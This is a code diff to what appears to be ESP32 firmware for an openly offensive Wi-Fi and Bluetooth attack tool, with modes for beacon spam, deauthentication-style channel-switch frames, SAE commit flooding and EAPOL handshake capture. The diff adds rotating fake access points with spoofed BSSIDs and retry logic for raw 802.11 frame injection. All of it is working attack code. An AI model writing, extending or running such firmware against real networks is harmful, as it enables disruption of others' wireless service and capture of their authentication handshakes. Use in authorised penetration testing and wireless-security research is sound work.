@@ -53,6 +53,8 @@ static uint8_t* capture=nullptr;static bool captureDirty=false;
 static SdRecords cardCapture;static bool captureOnCard=false;
 static File saveFile;static String savePath;static size_t saveOffset=0;static uint32_t saveCrc=0xffffffffu;
 static char ssids[32][33]{};static unsigned ssidCount=0;
+struct RandomBeacon {char name[33];uint8_t bssid[6];uint16_t sequence;};
+static RandomBeacon randomBeacons[30]{};static bool randomBeaconsReady=false;static uint32_t randomBeaconsAt=0;
 void say(const char* s){strlcpy(status.message,s,sizeof(status.message));}
 static bool busy(){return nodeBusy()||wardriveBusy()||cardCapture.busy()||status.active||status.saving||portalActive()||csiActive()||networkActive()||bleLabOwnsRadio();}
 static bool saveList(){auto* fs=bleLabStorage();if(!fs||!bleLabStorageSpace(8192))return false;fs->mkdir("/lists");File f=fs->open("/lists/ssids.part",FILE_WRITE);if(!f)return false;bool ok=true;
@@ -115,7 +117,7 @@ void captureStop(){bool was=status.recording;status.recording=false;wifiRecordin
 static bool appendCapture(const uint8_t* data,size_t n){if(captureOnCard){if(!cardCapture.append(data,n))return false;status.bytes=uint32_t(std::min<uint64_t>(UINT32_MAX,uint64_t(status.bytes)+n));++status.records;return true;}if(n>CaptureCapacity-status.bytes){captureStop();say("Capture buffer full; stopped without overwriting");return false;}memcpy(capture+status.bytes,data,n);status.bytes+=n;++status.records;return true;}
 bool start(AttackMode m){
  char why[128];if(!available(m,why,sizeof(why))){if(!status.active&&unsigned(m)<unsigned(AttackMode::Count)){status.attack=m;status.accepted=status.errors=status.responses=status.eapol=0;status.error=0;}say(why);return false;}
- running=target;runSeconds=seconds;runRate=rate;beaconLength=0;if(auto* a=selected()){beaconLength=a->length;memcpy(beacon,a->beacon,beaconLength);}
+ running=target;runSeconds=seconds;runRate=rate;beaconLength=0;randomBeaconsReady=false;if(auto* a=selected()){beaconLength=a->length;memcpy(beacon,a->beacon,beaconLength);}
  if(m==AttackMode::ActiveEapol&&!captureInit(false,true))return false;
  resumeRadio=radioEnabled;previousLock=channelLock;setRadio(false);
  status.active=true;status.attack=m;status.accepted=status.errors=status.responses=status.eapol=0;status.error=0;sequence=0;tokenSize=0;
@@ -139,10 +141,19 @@ static void tick(uint32_t now){
  uint32_t interval=ble?std::max<uint32_t>(100,1000/runRate):1000/runRate;if(now-lastTx<interval)return;lastTx=now;
  uint8_t entropy[96],source[6];esp_fill_random(entropy,sizeof(entropy));memcpy(source,ownMac,6);
  if(m==AttackMode::RandomBeacons||m==AttackMode::Probe||m==AttackMode::Authentication||m==AttackMode::ApSpam){memcpy(source,entropy+48,6);source[0]=(source[0]&0xfc)|2;}
+ RandomBeacon* random=nullptr;
+ if(m==AttackMode::RandomBeacons){
+   if(!randomBeaconsReady||now-randomBeaconsAt>=10000){
+     for(auto& identity:randomBeacons){uint8_t seed[8];esp_fill_random(seed,sizeof(seed));snprintf(identity.name,sizeof(identity.name),"DD-%02X%02X%02X%02X",seed[0],seed[1],seed[2],seed[3]);memcpy(identity.bssid,seed+2,6);identity.bssid[0]=(identity.bssid[0]&0xfc)|2;identity.sequence=esp_random()&4095;}
+     randomBeaconsAt=now;randomBeaconsReady=true;
+   }
+   random=&randomBeacons[sequence%30];strlcpy(running.ssid,random->name,sizeof(running.ssid));memcpy(source,random->bssid,6);
+ }
  if(sourceConfigured)memcpy(source,configuredSource,6);
  if(m==AttackMode::SaeCommit){if(crypto==1)return;if(crypto!=2){stop();say("SAE key generation failed");return;}memcpy(entropy,saeMaterial,96);memcpy(source,saeClient,6);}
  if(m==AttackMode::SsidList)strlcpy(running.ssid,ssids[sequence%ssidCount],33);
- size_t n=m==AttackMode::IBeacon?dragon::ibeacon::encode(packet,1200,beaconIdentity):m==AttackMode::CustomBle?copyBleAdvertisement(packet,1200,customAdvertisement,customLength):cloneMode(m)?cloneBeacon(packet,1200,beacon,beaconLength,sequence++,m==AttackMode::ChannelSwitch?37:m==AttackMode::Quiet?40:0,running.destinationChannel):ble?buildBleAttack(packet,1200,m,entropy):buildWifiAttack(packet,1200,m,running,source,sequence++,entropy);
+ size_t n=m==AttackMode::IBeacon?dragon::ibeacon::encode(packet,1200,beaconIdentity):m==AttackMode::CustomBle?copyBleAdvertisement(packet,1200,customAdvertisement,customLength):cloneMode(m)?cloneBeacon(packet,1200,beacon,beaconLength,sequence++,m==AttackMode::ChannelSwitch?37:m==AttackMode::Quiet?40:0,running.destinationChannel):ble?buildBleAttack(packet,1200,m,entropy):buildWifiAttack(packet,1200,random?AttackMode::Beacon:m,running,source,random?random->sequence:sequence,entropy);
+ if(random)++sequence;else if(!cloneMode(m)&&!ble&&m!=AttackMode::IBeacon&&m!=AttackMode::CustomBle)++sequence;
  if(n&&m==AttackMode::ApSpam){memcpy(packet+10,source,6);memcpy(packet+16,source,6);}
  if(n==128&&m==AttackMode::SaeCommit&&tokenSize){memmove(packet+32+tokenSize,packet+32,96);memcpy(packet+32,token,tokenSize);n+=tokenSize;}
  int result=ESP_ERR_INVALID_ARG;
@@ -150,8 +161,10 @@ static void tick(uint32_t now){
   if(bleRotatesAddress(m)){uint8_t address[6];memcpy(address,entropy+64,6);address[0]|=0xc0;identity=NimBLEDevice::setOwnAddr(NimBLEAddress(address,BLE_ADDR_RANDOM))&&NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);}
   else identity=NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC);
   bool ok=identity&&data.addData(packet,n)&&a->setAdvertisementData(data)&&a->start(interval+20);result=ok?ESP_OK:ESP_FAIL;}
- else if(n){if(packet[0]==0x80){uint64_t stamp=esp_timer_get_time();for(unsigned i=0;i<8;++i)packet[24+i]=stamp>>(8*i);}result=esp_wifi_80211_tx(WIFI_IF_STA,packet,n,false);}
- if(result==ESP_OK)++status.accepted;else{++status.errors;status.error=result;stop();snprintf(status.message,sizeof(status.message),"Driver rejected frame (%d); stopped",result);}
+ else if(n){if(packet[0]==0x80){uint64_t stamp=esp_timer_get_time();for(unsigned i=0;i<8;++i)packet[24+i]=stamp>>(8*i);}
+   for(unsigned attempt=0;attempt<3;++attempt){result=esp_wifi_80211_tx(WIFI_IF_STA,packet,n,false);if(result!=ESP_ERR_NO_MEM)break;delay(2);}
+ }
+ if(result==ESP_OK){++status.accepted;if(random)random->sequence=(random->sequence+1)&4095;}else{++status.errors;status.error=result;if(result==ESP_ERR_NO_MEM){say("Radio TX queue busy / retrying next interval");return;}stop();snprintf(status.message,sizeof(status.message),"Driver rejected frame (%d); stopped",result);}
 }
 static bool safeFile(const char* p){size_t n=strlen(p);if(n<6||n>=48||strstr(p,".."))return false;for(size_t i=0;i<n;++i)if(!isalnum(uint8_t(p[i]))&&p[i]!='-'&&p[i]!='.'&&p[i]!='_')return false;return true;}
 static bool serialWrite(const char* p,size_t n){RadioTransfer transfer;uint32_t at=millis();while(n){size_t k=std::min<size_t>(128,std::min(n,size_t(Serial.availableForWrite())));if(k){k=Serial.write((const uint8_t*)p,k);p+=k;n-=k;at=millis();}else if(millis()-at>5000)return false;radioTransferTick();delay(1);}return true;}
